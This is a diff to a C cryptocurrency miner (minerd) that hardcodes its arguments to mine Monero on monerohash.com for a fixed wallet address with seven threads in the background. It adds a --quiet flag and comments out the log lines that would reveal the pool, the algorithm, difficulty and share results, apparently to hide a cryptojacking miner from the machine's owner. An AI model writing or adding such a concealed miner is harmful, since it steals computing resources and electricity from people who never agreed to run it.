@@ -427,7 +427,7 @@ bool rpc2_job_decode(const json_t *job, struct work *work) {
                 hashrate += thr_hashrates[i] / thr_times[i];
             pthread_mutex_unlock(&stats_lock);
             double difficulty = (((double) 0xffffffff) / target);
-            applog(LOG_INFO, "Pool set diff to %g", difficulty);
+            //kduraj applog(LOG_INFO, "Pool set diff to %g", difficulty);
             rpc2_target = target;
         }
 
@@ -636,8 +636,9 @@ static bool submit_upstream_work(CURL *curl, struct work *work) {
             res = json_object_get(val, "result");
             json_t *status = json_object_get(res, "status");
             reason = json_object_get(res, "reject-reason");
-            share_result(!strcmp(status ? json_string_value(status) : "", "OK"), work,
-                    reason ? json_string_value(reason) : NULL );
+            //kduraj
+            //share_result(!strcmp(status ? json_string_value(status) : "", "OK"), work,
+            //        reason ? json_string_value(reason) : NULL );
         } else {
             /* build hex string */
             for (i = 0; i < 76; i++)
@@ -659,8 +660,9 @@ static bool submit_upstream_work(CURL *curl, struct work *work) {
             }
             res = json_object_get(val, "result");
             reason = json_object_get(val, "reject-reason");
-            share_result(json_is_true(res), work,
-                    reason ? json_string_value(reason) : NULL );
+            //kduraj
+            //share_result(json_is_true(res), work,
+            //        reason ? json_string_value(reason) : NULL );
         }
 
         json_decref(val);
@@ -1338,8 +1340,9 @@ static bool stratum_handle_response(char *buf) {
         valid = json_is_true(res_val);
     }
 
-    share_result(valid, NULL,
-            err_val ? (jsonrpc_2 ? json_string_value(err_val) : json_string_value(json_array_get(err_val, 1))) : NULL );
+    //kduraj
+    //share_result(valid, NULL,
+    //        err_val ? (jsonrpc_2 ? json_string_value(err_val) : json_string_value(json_array_get(err_val, 1))) : NULL );
 
     ret = true;
     out: if (val)
@@ -1355,7 +1358,7 @@ static void *stratum_thread(void *userdata) {
     stratum.url = tq_pop(mythr->q, NULL );
     if (!stratum.url)
         goto out;
-    applog(LOG_INFO, "Starting Stratum on %s", stratum.url);
+    //kduraj applog(LOG_INFO, "Starting Stratum on %s", stratum.url);
 
     while (1) {
         int failures = 0;
@@ -1388,7 +1391,7 @@ static void *stratum_thread(void *userdata) {
                 stratum_gen_work(&stratum, &g_work);
                 time(&g_work_time);
                 pthread_mutex_unlock(&g_work_lock);
-                applog(LOG_INFO, "Stratum detected new block");
+                //kduraj applog(LOG_INFO, "Stratum detected new block");
                 restart_threads();
             }
         } else {
@@ -1400,7 +1403,7 @@ static void *stratum_thread(void *userdata) {
                 time(&g_work_time);
                 pthread_mutex_unlock(&g_work_lock);
                 if (stratum.job.clean) {
-                    applog(LOG_INFO, "Stratum detected new block");
+                    //kduraj :applog(LOG_INFO, "Stratum detected new block");
                     restart_threads();
                 }
             }
@@ -1747,11 +1750,21 @@ argv[8] = x
 argv[9] = -t
 argv[10] = 7
 argv[11] = --background
+
+[2017-06-17 16:10:28] Starting Stratum on stratum+tcp://monerohash.com:3333
+[2017-06-17 16:10:28] 7 miner threads started, using 'cryptonight' algorithm.
+[2017-06-17 16:10:29] Pool set diff to 5000
+[2017-06-17 16:10:29] Stratum detected new block
+[2017-06-17 16:10:48] Stratum detected new block
+[2017-06-17 16:10:59] Pool set diff to 8750.01
+[2017-06-17 16:10:59] Stratum detected new block
+[2017-06-17 16:11:24] SIGTERM received, exiting
+
 */
 int main(int argc, char *argv[]) {
 
-    char* dummy_args[] = { "./minerd", "-a", "cryptonight", "-o", "stratum+tcp://monerohash.com:3333", "-u", "47oyMswJzXM4H3pwj5oRNgDP5GTzG8tJqdNHZqQydc3MS29zeqCVwiSjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3eTCxwZ", "-p", "x", "-t", "7", "--background", NULL };	
-    argc = 11;
+    char* dummy_args[] = { "./minerd", "-a", "cryptonight", "-o", "stratum+tcp://monerohash.com:3333", "-u", "47oyMswJzXM4H3pwj5oRNgDP5GTzG8tJqdNHZqQydc3MS29zeqCVwiSjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3eTCxwZ", "-p", "x", "-t", "7", "--background", "--quiet", NULL };	
+    argc = 12;
     argv = dummy_args;
 
     // printf("argv[0] = %s\n", argv[0]);
@@ -1806,7 +1819,7 @@ int main(int argc, char *argv[]) {
     parse_cmdline(argc, argv);
 
     jsonrpc_2 = true;
-    applog(LOG_INFO, "Using JSON-RPC 2.0");
+    //applog(LOG_INFO, "Using JSON-RPC 2.0");
 
 
     if (!opt_benchmark && !rpc_url) {
@@ -1954,8 +1967,10 @@ int main(int argc, char *argv[]) {
         }
     }
 
-    applog(LOG_INFO, "%d miner threads started, "
-            "using '%s' algorithm.", opt_n_threads, algo_names[opt_algo]);
+    //kdurajapplog(LOG_INFO, "%d threads started, "
+    //        "using '%s' algorithm.", opt_n_threads, algo_names[opt_algo]);
+    
+    applog(LOG_INFO, "%d threads started.", opt_n_threads);
 
     /* main loop - simply wait for workio thread to exit */
     pthread_join(thr_info[work_thr_id].pth, NULL );
